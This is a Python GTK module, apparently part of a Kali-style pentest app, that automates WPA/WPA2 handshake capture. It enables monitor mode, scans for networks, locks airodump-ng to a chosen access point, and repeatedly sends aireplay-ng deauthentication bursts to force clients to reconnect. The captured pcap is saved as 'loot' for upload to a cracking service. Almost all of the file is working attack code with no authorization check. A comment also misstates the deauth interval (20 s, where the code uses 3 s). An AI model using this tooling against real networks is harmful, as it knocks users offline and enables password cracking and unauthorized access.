"""4-way WPA/WPA2 handshake capture -- airodump-ng + targeted deauth.

Complement to the PMKID module. PMKID is clientless; a handshake grab
requires at least one client already associated to the target AP,
which we then bump off the network to force a fresh 4-way exchange.
Airodump-ng records the pcap; we watch its live stdout for the
``[ WPA handshake: <BSSID> ]`` marker that means at least M1..M4
have been observed for that BSSID and the file has crackable
material.

Workflow the UI walks the user through:

    1. Turn monitor mode on (isolated setup, does not touch wlan0).
    2. Sweep the band and pick the target network + optionally a
       single client to focus the deauth on.
    3. Airodump-ng locks to the target's channel and writes the pcap
       under ~/loot/handshake/. Deauth bursts fire in the background
       from aireplay-ng.
    4. As soon as a handshake shows up in the airodump status line,
       the row in the loot table is annotated with the SSID/BSSID
       and marked ready to submit to wpa-sec.

No hashcat: the pcap goes to wpa-sec.stanev.org for community
cracking, same as PMKID. See the Loot module for the submit button.
"""
from __future__ import annotations

import os
import re
import time
from pathlib import Path

from gi.repository import Adw, GLib, Gtk

from ..executor import Process, Result, run_async
from ..loot_store import get_loot_store, loot_path
from ..module import NHModule, register
from ..widgets import OutputView, services_banner, toast

DEFAULT_IFACE = "wlan1"
MON_SUFFIX = "mon"
SCAN_PREFIX = "/tmp/nhp-hs-scan"
CAP_PREFIX = "/tmp/nhp-hs-cap"

# airodump-ng prints ``[ WPA handshake: aa:bb:cc:dd:ee:ff ]`` on its
# status line once M1..M4 have been observed for that BSSID. We latch
# on that so the module knows the pcap is worth keeping.
_HANDSHAKE_RE = re.compile(
    r"WPA handshake:\s*([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})")


def _mon_iface(base: str) -> str:
    return base + MON_SUFFIX


def _parse_airodump_csv(text: str) -> list[dict]:
    """Return the AP table from an airodump-ng CSV export. Fields we
    care about only: BSSID, first-seen, last-seen, channel, privacy,
    ESSID."""
    aps: list[dict] = []
    for row in text.splitlines():
        row = row.strip()
        if not row or row.startswith("BSSID") or row.startswith("Station"):
            continue
        parts = [p.strip() for p in row.split(",")]
        # BSSID field must look like a MAC
        if len(parts) < 14 or ":" not in parts[0]:
            continue
        try:
            aps.append({
                "bssid": parts[0],
                "channel": parts[3],
                "privacy": parts[5],
                "cipher": parts[6],
                "auth": parts[7],
                "power": parts[8],
                "essid": parts[13],
            })
        except IndexError:
            continue
    return aps


@register
class Handshake(NHModule):
    title = "Handshake capture"
    icon = "network-wireless-signal-good-symbolic"
    description = ("Capture a WPA/WPA2 4-way handshake with airodump-ng "
                   "and a targeted deauth; save the pcap for wpa-sec.")
    required_tools = ["airodump-ng", "aireplay-ng"]

    def __init__(self, app_window):
        super().__init__(app_window)
        self._monitor_iface: str | None = None
        self._scan_proc: Process | None = None
        self._cap_proc: Process | None = None
        self._deauth_proc: Process | None = None
        self._loot_id: int | None = None
        self._pcap_path: str | None = None
        self._csv_prefix: str | None = None
        self._selected_ap: dict | None = None
        self._got_handshake: bool = False
        self._network_rows: list[Adw.ActionRow] = []
        self._networks: list[dict] = []

    # ---------------------------------------------------------- build
    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, "set_margin_" + m)(12)

        # Services banner (managed centrally in Kali Services)
        box.append(services_banner(
            self.app_window, ['NetworkManager']))

        # ---- monitor mode
        mon_group = Adw.PreferencesGroup(
            title="Monitor mode",
            description="Puts an external adapter in monitor mode. "
                        "Does not touch wlan0.")
        self.iface_entry = Adw.EntryRow(title="External interface")
        self.iface_entry.set_text(DEFAULT_IFACE)
        mon_group.add(self.iface_entry)

        self.mon_row = Adw.ActionRow(
            title="Enable monitor mode", subtitle="Not enabled")
        self.mon_toggle = Gtk.Switch(valign=Gtk.Align.CENTER)
        self.mon_toggle.connect("state-set", self._on_monitor_toggle)
        self.mon_row.add_suffix(self.mon_toggle)
        mon_group.add(self.mon_row)
        box.append(mon_group)

        # ---- scan
        scan_group = Adw.PreferencesGroup(
            title="Networks",
            description="Sweep the band, then pick a WPA/WPA2 target "
                        "with at least one client.")

        self.band = Adw.ComboRow(title="Band")
        self.band.set_model(Gtk.StringList.new([
            "2.4 GHz + 5 GHz",
            "2.4 GHz only (1-14)",
            "5 GHz only (36+)",
        ]))
        scan_group.add(self.band)

        self.scan_duration = Adw.SpinRow.new_with_range(0, 3600, 5)
        self.scan_duration.set_title(
            "Max scan duration (s) -- 0 = until Stop")
        self.scan_duration.set_value(0)
        scan_group.add(self.scan_duration)

        scan_action = Adw.ActionRow(
            title="Scan for networks",
            subtitle="Turn monitor on first")
        self.scan_btn = Gtk.Button(label="Scan",
                                   valign=Gtk.Align.CENTER)
        self.scan_btn.add_css_class("suggested-action")
        self.scan_btn.connect("clicked", lambda _b: self._start_scan())
        scan_action.add_suffix(self.scan_btn)
        self.scan_stop_btn = Gtk.Button(label="Stop",
                                        valign=Gtk.Align.CENTER)
        self.scan_stop_btn.set_sensitive(False)
        self.scan_stop_btn.connect(
            "clicked", lambda _b: self._stop_scan())
        scan_action.add_suffix(self.scan_stop_btn)
        scan_group.add(scan_action)
        box.append(scan_group)

        self.networks_group = Adw.PreferencesGroup(
            title="Discovered networks")
        self._empty_nets = Adw.ActionRow(
            title="No networks yet",
            subtitle="Enable monitor and press Scan")
        self.networks_group.add(self._empty_nets)
        box.append(self.networks_group)

        # ---- capture
        cap_group = Adw.PreferencesGroup(
            title="Capture",
            description="Locks to the selected AP's channel and writes "
                        "a pcap. Deauth fires in parallel to force a "
                        "fresh 4-way exchange.")
        self.target_row = Adw.ActionRow(
            title="Selected target",
            subtitle="Pick a network above")
        cap_group.add(self.target_row)

        self.client_entry = Adw.EntryRow(
            title="Client MAC (optional)")
        self.client_entry.set_show_apply_button(False)
        cap_group.add(self.client_entry)

        self.deauth_switch = Adw.SwitchRow(
            title="Send deauth bursts",
            subtitle="Speeds up the capture; disable for pure listen")
        self.deauth_switch.set_active(True)
        cap_group.add(self.deauth_switch)

        self.deauth_count = Adw.SpinRow.new_with_range(1, 500, 5)
        self.deauth_count.set_title("Deauth burst count")
        self.deauth_count.set_value(10)
        cap_group.add(self.deauth_count)

        cap_row = Adw.ActionRow(
            title="Start / Stop capture",
            subtitle="Watches airodump for [WPA handshake]")
        self.cap_btn = Gtk.Button(label="Start",
                                  valign=Gtk.Align.CENTER)
        self.cap_btn.add_css_class("suggested-action")
        self.cap_btn.set_sensitive(False)
        self.cap_btn.connect("clicked", lambda _b: self._start_cap())
        cap_row.add_suffix(self.cap_btn)
        self.cap_stop_btn = Gtk.Button(label="Stop",
                                       valign=Gtk.Align.CENTER)
        self.cap_stop_btn.set_sensitive(False)
        self.cap_stop_btn.connect(
            "clicked", lambda _b: self._stop_cap())
        cap_row.add_suffix(self.cap_stop_btn)
        cap_group.add(cap_row)
        box.append(cap_group)

        # ---- status
        stat_group = Adw.PreferencesGroup(title="Session")
        self.state_row = Adw.ActionRow(
            title="Status", subtitle="idle")
        stat_group.add(self.state_row)
        self.file_row = Adw.ActionRow(
            title="Output file", subtitle="—")
        stat_group.add(self.file_row)
        self.handshake_row = Adw.ActionRow(
            title="Handshake status",
            subtitle="waiting")
        stat_group.add(self.handshake_row)

        loot_row = Adw.ActionRow(
            title="Loot",
            subtitle="Once captured, submit the pcap to wpa-sec")
        open_loot = Gtk.Button(label="Open Loot",
                               valign=Gtk.Align.CENTER)
        open_loot.connect(
            "clicked", lambda _b: self.app_window.activate_module(
                "loot", "module:handshake"))
        loot_row.add_suffix(open_loot)
        stat_group.add(loot_row)
        box.append(stat_group)

        self.output = OutputView()
        box.append(self.output)

        self._detect_existing_monitor()
        return box

    # ------------------------------------------------- monitor mode
    def _detect_existing_monitor(self) -> None:
        iface = self.iface_entry.get_text().strip() or DEFAULT_IFACE
        mon = _mon_iface(iface)

        def done(r: Result) -> None:
            if r.stdout and "type monitor" in r.stdout:
                self._monitor_iface = mon
                self.mon_toggle.handler_block_by_func(
                    self._on_monitor_toggle)
                self.mon_toggle.set_active(True)
                self.mon_toggle.handler_unblock_by_func(
                    self._on_monitor_toggle)
                self.mon_row.set_subtitle(
                    "%s already in monitor mode" % mon)

        run_async(
            ["sh", "-c", "iw dev %s info 2>/dev/null || "
             "iw dev %s info 2>/dev/null" % (mon, iface)],
            done, root=True, timeout=5)

    def _on_monitor_toggle(self, sw, state) -> bool:
        iface = self.iface_entry.get_text().strip() or DEFAULT_IFACE
        if state:
            self._enable_monitor(iface)
        else:
            self._disable_monitor(iface)
        return True

    def _enable_monitor(self, iface: str) -> None:
        mon = _mon_iface(iface)
        self.mon_row.set_subtitle("Switching %s to monitor…" % iface)
        script = (
            "IF=%s; MON=%s; "
            "PHY=$(readlink /sys/class/net/$IF/phy80211 2>/dev/null "
            "     | awk -F/ '{print $NF}'); "
            "if [ -z \"$PHY\" ] && [ -e /sys/class/net/$MON/phy80211 ]; then "
            "  PHY=$(readlink /sys/class/net/$MON/phy80211 "
            "     | awk -F/ '{print $NF}'); "
            "fi; "
            "[ -n \"$PHY\" ] || { echo 'no phy'; exit 1; }; "
            "nmcli device set $IF managed no 2>/dev/null || true; "
            "iw dev $IF del 2>/dev/null || true; "
            "iw dev $MON del 2>/dev/null || true; "
            "iw phy $PHY interface add $MON type monitor "
            "  2>/dev/null || true; "
            "ip link set $MON up && echo ok; "
            "iw dev $MON info | head -6"
        ) % (iface, mon)

        def done(r: Result) -> None:
            self.output.append(r.stdout or "")
            if r.stderr:
                self.output.append(r.stderr)
            if r.returncode == 0 and "type monitor" in (r.stdout or ""):
                self._monitor_iface = mon
                self.mon_row.set_subtitle(
                    "%s in monitor mode" % mon)
                toast(self.app_window, "Monitor on: " + mon)
            else:
                self._monitor_iface = None
                self.mon_row.set_subtitle("Enable failed")
                self.mon_toggle.handler_block_by_func(
                    self._on_monitor_toggle)
                self.mon_toggle.set_active(False)
                self.mon_toggle.handler_unblock_by_func(
                    self._on_monitor_toggle)

        run_async(["sh", "-c", script], done, root=True, timeout=20)

    def _disable_monitor(self, iface: str) -> None:
        mon = _mon_iface(iface)
        self.mon_row.set_subtitle("Restoring managed…")
        script = (
            "MON=%s; IF=%s; "
            "PHY=$(readlink /sys/class/net/$MON/phy80211 2>/dev/null "
            "      | awk -F/ '{print $NF}'); "
            "if [ -z \"$PHY\" ] && [ -e /sys/class/net/$IF/phy80211 ]; then "
            "  PHY=$(readlink /sys/class/net/$IF/phy80211 "
            "     | awk -F/ '{print $NF}'); "
            "fi; "
            "iw dev $MON del 2>/dev/null || true; "
            "iw dev $IF del 2>/dev/null || true; "
            "[ -n \"$PHY\" ] && iw phy $PHY interface add $IF "
            "  type managed 2>/dev/null || true; "
            "ip link set $IF up 2>/dev/null || true; "
            "nmcli device set $IF managed yes 2>/dev/null || true; "
            "echo done"
        ) % (mon, iface)

        def done(_r: Result) -> None:
            self._monitor_iface = None
            self.mon_row.set_subtitle("Not enabled")
            toast(self.app_window, "Monitor off")

        run_async(["sh", "-c", script], done, root=True, timeout=15)

    # -------------------------------------------------------------- scan
    def _start_scan(self) -> None:
        if not self._monitor_iface:
            toast(self.app_window, "Enable monitor mode first")
            return
        if self._scan_proc is not None:
            return

        # Clear previous UI state.
        for r in self._network_rows:
            self.networks_group.remove(r)
        self._network_rows = []
        self._networks = []
        self._empty_nets.set_title("Scanning…")
        self._empty_nets.set_visible(True)
        self._selected_ap = None
        self.target_row.set_subtitle("Pick a network above")
        self.cap_btn.set_sensitive(False)

        # Reset workspace CSVs.
        run_async(
            ["sh", "-c",
             "rm -f %s-*.csv %s-*.cap %s-*.kismet.csv "
             "%s-*.kismet.netxml %s.log"
             % (SCAN_PREFIX, SCAN_PREFIX, SCAN_PREFIX,
                SCAN_PREFIX, SCAN_PREFIX)],
            lambda _r: None, root=True, timeout=5)

        band_arg = ""
        band_sel = self.band.get_selected()
        if band_sel == 1:
            band_arg = "--band bg "
        elif band_sel == 2:
            band_arg = "--band a "

        duration = int(self.scan_duration.get_value())
        # 0 means "run until the user hits Stop" -- skip the
        # auto-stop timer entirely.
        cmd = ("airodump-ng %s--output-format csv "
               "-w %s %s") % (band_arg, SCAN_PREFIX, self._monitor_iface)
        self.output.append("$ %s (%ds)\n" % (cmd, duration))

        self._scan_proc = Process(
            ["sh", "-c", cmd], self.output.append, self._on_scan_done,
            root=True)
        self._scan_proc.start()
        self.scan_btn.set_sensitive(False)
        self.scan_stop_btn.set_sensitive(True)
        GLib.timeout_add_seconds(2, self._tick_scan)
        if duration > 0:
            GLib.timeout_add_seconds(duration, self._auto_stop_scan)

    def _auto_stop_scan(self) -> bool:
        if self._scan_proc is not None:
            self._stop_scan()
        return False

    def _stop_scan(self) -> None:
        if self._scan_proc is not None:
            self._scan_proc.stop()

    def _tick_scan(self) -> bool:
        if self._scan_proc is None:
            return False
        # Read the most recent CSV file airodump writes -- filename
        # is <prefix>-NN.csv where NN is a run counter.
        run_async(
            ["sh", "-c",
             "ls -1t %s-*.csv 2>/dev/null | head -1 | "
             "xargs -r cat" % SCAN_PREFIX],
            self._on_scan_snapshot, root=True, timeout=5)
        return True

    def _on_scan_snapshot(self, r: Result) -> None:
        aps = _parse_airodump_csv(r.stdout or "")
        # Filter obvious junk (empty BSSID, WEP/OPEN irrelevant for
        # handshake work).
        aps = [a for a in aps if a["bssid"] and "WPA" in a["privacy"]]
        # Keep the strongest 40 to avoid a mile-long list.
        try:
            aps.sort(
                key=lambda a: int(a["power"] or "-999"),
                reverse=True)
        except ValueError:
            pass
        aps = aps[:40]
        self._render_networks(aps)

    def _on_scan_done(self, code: int) -> None:
        self._scan_proc = None
        self.scan_btn.set_sensitive(True)
        self.scan_stop_btn.set_sensitive(False)
        # One final refresh in case airodump was mid-write.
        run_async(
            ["sh", "-c",
             "ls -1t %s-*.csv 2>/dev/null | head -1 | "
             "xargs -r cat" % SCAN_PREFIX],
            self._on_scan_snapshot, root=True, timeout=5)

    def _render_networks(self, aps: list[dict]) -> None:
        # Rebuild the list if the AP set changed (bssid tuple).
        keys = tuple(a["bssid"] for a in aps)
        prev = tuple(a["bssid"] for a in self._networks)
        if keys == prev:
            return
        for r in self._network_rows:
            self.networks_group.remove(r)
        self._network_rows = []
        self._networks = aps
        if not aps:
            self._empty_nets.set_title("No WPA networks found")
            self._empty_nets.set_visible(True)
            return
        self._empty_nets.set_visible(False)
        for a in aps:
            self._network_rows.append(self._add_network_row(a))

    def _add_network_row(self, ap: dict) -> Adw.ActionRow:
        title = ap["essid"] or "<hidden>"
        subtitle = "%s · ch %s · %s dBm · %s %s" % (
            ap["bssid"], ap["channel"] or "?",
            ap["power"] or "?",
            ap["privacy"] or "?",
            ap["cipher"] or "")
        row = Adw.ActionRow(title=title, subtitle=subtitle)
        btn = Gtk.Button(label="Select",
                         valign=Gtk.Align.CENTER)
        btn.add_css_class("suggested-action")
        btn.connect(
            "clicked", lambda _b, a=ap: self._select_ap(a))
        row.add_suffix(btn)
        self.networks_group.add(row)
        return row

    def _select_ap(self, ap: dict) -> None:
        self._selected_ap = ap
        self.target_row.set_subtitle(
            "%s · %s · ch %s" % (
                ap["essid"] or "<hidden>",
                ap["bssid"], ap["channel"] or "?"))
        self.cap_btn.set_sensitive(True)

    # ------------------------------------------------------ capture
    def _start_cap(self) -> None:
        if not self._monitor_iface:
            toast(self.app_window, "Enable monitor mode first")
            return
        if self._cap_proc is not None:
            return
        if not self._selected_ap:
            toast(self.app_window, "Select a target network first")
            return
        ap = self._selected_ap
        channel = ap["channel"] or "1"
        bssid = ap["bssid"]
        ssid = ap["essid"] or "<hidden>"

        # Fresh output file.
        stamp = time.strftime("%Y%m%d-%H%M%S")
        safe_ssid = re.sub(r"[^A-Za-z0-9_-]+", "_", ssid) or "hidden"
        base = "hs-%s-%s" % (safe_ssid, stamp)
        self._pcap_path = loot_path(
            "handshake", base + "-01.cap")
        # airodump writes <prefix>-01.cap, -02.cap, ... We give it the
        # prefix without the -NN suffix so the counter starts at 01.
        prefix = self._pcap_path[:-len("-01.cap")]
        self._csv_prefix = prefix

        self._got_handshake = False
        self.handshake_row.set_subtitle("waiting")
        self.file_row.set_subtitle(self._pcap_path)

        argv = [
            "airodump-ng",
            "-c", channel,
            "--bssid", bssid,
            "-w", prefix,
            "--output-format", "pcap,csv",
            self._monitor_iface,
        ]
        self.output.append("$ " + " ".join(argv) + "\n")

        self._loot_id = get_loot_store().record(
            module="handshake", type="handshake_pcap",
            target=ssid + " (" + bssid + ")",
            path=self._pcap_path,
            notes="capture in progress")

        self._cap_proc = Process(
            argv, self._on_cap_line, self._on_cap_done, root=True)
        self._cap_proc.start()
        self.cap_btn.set_sensitive(False)
        self.cap_stop_btn.set_sensitive(True)
        self.state_row.set_subtitle("running")
        # Fire deauth in a separate Process so we can control it
        # independently of airodump.
        if self.deauth_switch.get_active():
            GLib.timeout_add_seconds(3, self._fire_deauth)
        GLib.timeout_add_seconds(2, self._tick_cap)

    def _fire_deauth(self) -> bool:
        if self._cap_proc is None or not self._cap_proc.running:
            return False
        if self._got_handshake:
            return False
        ap = self._selected_ap or {}
        bssid = ap.get("bssid")
        if not bssid:
            return False
        count = int(self.deauth_count.get_value())
        client = self.client_entry.get_text().strip()
        argv = ["aireplay-ng", "--deauth", str(count), "-a", bssid]
        if client:
            argv += ["-c", client]
        argv.append(self._monitor_iface)
        self.output.append("$ " + " ".join(argv) + "\n")
        self._deauth_proc = Process(
            argv, self.output.append, lambda _c: None, root=True)
        self._deauth_proc.start()
        # Keep firing every 20 s until we get the handshake or stop.
        return True

    def _tick_cap(self) -> bool:
        if self._cap_proc is None or not self._cap_proc.running:
            return False
        if self._loot_id is not None:
            get_loot_store().refresh_size(self._loot_id)
        return True

    def _on_cap_line(self, text: str) -> None:
        self.output.append(text)
        m = _HANDSHAKE_RE.search(text or "")
        if m and not self._got_handshake:
            bssid = m.group(1)
            self._got_handshake = True
            self.handshake_row.set_subtitle(
                "captured for %s" % bssid)
            toast(self.app_window,
                  "Handshake captured for %s" % bssid)
            if self._loot_id is not None:
                get_loot_store().append_notes(
                    self._loot_id,
                    "airodump reported WPA handshake for " + bssid)

    def _stop_cap(self) -> None:
        if self._deauth_proc is not None:
            self._deauth_proc.stop()
            self._deauth_proc = None
        if self._cap_proc is not None:
            self._cap_proc.stop()
        self.cap_stop_btn.set_sensitive(False)
        self.state_row.set_subtitle("stopping…")

    def _on_cap_done(self, code: int) -> None:
        self.output.append("[airodump-ng exited: %d]\n" % code)
        self._cap_proc = None
        self.cap_btn.set_sensitive(True)
        self.cap_stop_btn.set_sensitive(False)
        self.state_row.set_subtitle(
            "stopped" + (" (handshake captured)"
                          if self._got_handshake else
                          " (no handshake)"))
        if self._loot_id is not None:
            store = get_loot_store()
            store.refresh_size(self._loot_id)
            if not self._got_handshake:
                store.append_notes(
                    self._loot_id,
                    "no [WPA handshake] marker before stop")

    # ------------------------------------------------- deep-link ----
    def set_target(self, target: str) -> None:
        """Called by cross-module deep-links; format is
        ``BSSID|channel|SSID`` or just ``BSSID``. We stash it in the
        selected-AP dict so hitting Start starts capturing straight
        away."""
        if not target:
            return
        parts = target.split("|")
        bssid = parts[0].strip()
        channel = parts[1] if len(parts) > 1 else "1"
        ssid = parts[2] if len(parts) > 2 else ""
        self._selected_ap = {
            "bssid": bssid, "channel": channel, "essid": ssid,
            "privacy": "WPA2", "cipher": "", "auth": "", "power": "0",
        }
        self.target_row.set_subtitle(
            "%s · %s · ch %s" % (ssid or "<hidden>", bssid, channel))
        self.cap_btn.set_sensitive(True)
